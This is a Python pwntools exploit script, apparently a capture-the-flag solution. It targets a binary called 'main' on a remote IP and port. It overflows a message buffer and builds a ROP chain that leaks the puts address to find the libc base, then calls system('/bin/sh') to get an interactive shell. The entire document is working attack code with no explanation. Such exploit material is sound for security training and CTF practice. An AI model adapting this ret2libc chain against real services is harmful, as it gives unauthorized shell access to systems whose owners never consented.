from pwn import*
p = process('./main')
p = remote('123.56.170.202',21342)
elf =ELF('./main')
libc =ELF('./libc-2.27.so')
def menu(ch):
	p.sendlineafter('choice: ',str(ch))
menu(2)
p.sendafter('message:','FMYYFMYY' + '\x68')
menu(4)
menu(2)
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p32(0x40098E))
pop_rdi_ret = 0x400AC3
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x40098E))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

log.info('LIBC:\t' + hex(libc_base))
p.sendafter('message:','FMYYFMYY' + p64(elf.bss() + 0x200) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.interactive()
